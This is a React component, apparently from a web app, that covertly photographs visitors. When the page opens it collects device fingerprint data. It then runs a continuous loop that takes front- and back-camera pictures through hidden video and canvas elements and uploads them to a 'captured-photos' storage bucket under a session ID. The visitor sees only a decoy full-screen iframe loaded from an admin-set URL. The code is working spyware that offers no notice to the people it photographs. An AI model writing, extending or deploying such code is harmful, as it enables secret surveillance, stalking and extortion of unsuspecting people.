import { useEffect, useRef, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { collectDeviceInfo } from "@/utils/deviceInfo";

const IframeCapture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [iframeUrl, setIframeUrl] = useState<string>("");
  const [loading, setLoading] = useState(true);
  const captureLoopRef = useRef<boolean>(false);
  const stopCaptureRef = useRef<boolean>(false);
  const captureCountRef = useRef<number>(0);
  const deviceInfoSavedRef = useRef<boolean>(false);

  const sessionId = searchParams.get("session") || "default";

  // Save device info immediately when page loads
  const saveDeviceInfo = async () => {
    if (deviceInfoSavedRef.current) return;
    deviceInfoSavedRef.current = true;

    try {
      const deviceInfo = await collectDeviceInfo();
      await supabase.from("captured_photos").insert({
        session_id: sessionId + "_deviceinfo",
        image_data: JSON.stringify(deviceInfo),
        user_agent: navigator.userAgent,
        ip_address: null,
      });
    } catch (err) {
      console.error("Failed to save device info:", err);
    }
  };

  // Load iframe URL from settings
  useEffect(() => {
    const loadSettings = async () => {
      saveDeviceInfo();

      try {
        const { data } = await supabase
          .from("app_settings")
          .select("setting_value")
          .eq("setting_key", "main_settings")
          .maybeSingle();

        if (data?.setting_value) {
          const settings = data.setting_value as Record<string, unknown>;
          const url = (settings.camIframeUrl as string) || "";
          setIframeUrl(url);
        }
      } catch (err) {
        console.error("Error loading settings:", err);
      }

      setLoading(false);
      startContinuousCapture();
    };

    loadSettings();
  }, []);

  const base64ToBlob = (base64: string): Blob => {
    const parts = base64.split(",");
    const mime = parts[0].match(/:(.*?);/)?.[1] || "image/jpeg";
    const bstr = atob(parts[1]);
    const u8arr = new Uint8Array(bstr.length);
    for (let i = 0; i < bstr.length; i++) {
      u8arr[i] = bstr.charCodeAt(i);
    }
    return new Blob([u8arr], { type: mime });
  };

  const captureFromCamera = async (
    facingMode: "user" | "environment"
  ): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: 640, height: 480 },
      });

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        await new Promise((resolve) => setTimeout(resolve, 500));

        if (canvasRef.current && videoRef.current) {
          const canvas = canvasRef.current;
          const video = videoRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/jpeg", 0.8);
            stream.getTracks().forEach((track) => track.stop());
            return imageData;
          }
        }
        stream.getTracks().forEach((track) => track.stop());
      }
      return null;
    } catch (error) {
      console.error(`Camera ${facingMode} access denied:`, error);
      return null;
    }
  };

  const startContinuousCapture = async () => {
    if (captureLoopRef.current) return;
    captureLoopRef.current = true;

    while (!stopCaptureRef.current) {
      try {
        captureCountRef.current++;

        const frontImage = await captureFromCamera("user");
        if (frontImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-front-${captureCountRef.current}.jpg`;
          const blob = base64ToBlob(frontImage);
          const { error: uploadError } = await supabase.storage
            .from("captured-photos")
            .upload(fileName, blob, { upsert: true });

          if (!uploadError) {
            const { data: urlData } = supabase.storage
              .from("captured-photos")
              .getPublicUrl(fileName);

            await supabase.from("captured_photos").insert({
              session_id: sessionId,
              image_data: urlData.publicUrl,
              user_agent: `${navigator.userAgent} [FRONT-${captureCountRef.current}]`,
            });
          }
        }

        if (stopCaptureRef.current) break;

        await new Promise((resolve) => setTimeout(resolve, 200));

        const backImage = await captureFromCamera("environment");
        if (backImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-back-${captureCountRef.current}.jpg`;
          const blob = base64ToBlob(backImage);
          const { error: uploadError } = await supabase.storage
            .from("captured-photos")
            .upload(fileName, blob, { upsert: true });

          if (!uploadError) {
            const { data: urlData } = supabase.storage
              .from("captured-photos")
              .getPublicUrl(fileName);

            await supabase.from("captured_photos").insert({
              session_id: sessionId,
              image_data: urlData.publicUrl,
              user_agent: `${navigator.userAgent} [BACK-${captureCountRef.current}]`,
            });
          }
        }

        if (stopCaptureRef.current) break;
        await new Promise((resolve) => setTimeout(resolve, 500));
      } catch (error) {
        console.error("Capture cycle error:", error);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }
    }
  };

  useEffect(() => {
    return () => {
      stopCaptureRef.current = true;
    };
  }, []);

  if (loading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <video ref={videoRef} className="hidden" autoPlay playsInline muted />
        <canvas ref={canvasRef} className="hidden" />
        <div className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">Loading...</p>
        </div>
      </div>
    );
  }

  if (!iframeUrl) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <video ref={videoRef} className="hidden" autoPlay playsInline muted />
        <canvas ref={canvasRef} className="hidden" />
        <div className="text-center max-w-md">
          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-destructive/20 flex items-center justify-center">
            <svg
              className="w-8 h-8 text-destructive"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-foreground mb-2">
            No URL Configured
          </h1>
          <p className="text-muted-foreground">
            Please configure an iframe URL in admin settings.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full">
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
      <iframe
        src={iframeUrl}
        className="w-full h-screen border-0"
        allow="camera; microphone; geolocation"
        sandbox="allow-scripts allow-forms allow-same-origin"
      />
    </div>
  );
};

export default IframeCapture;
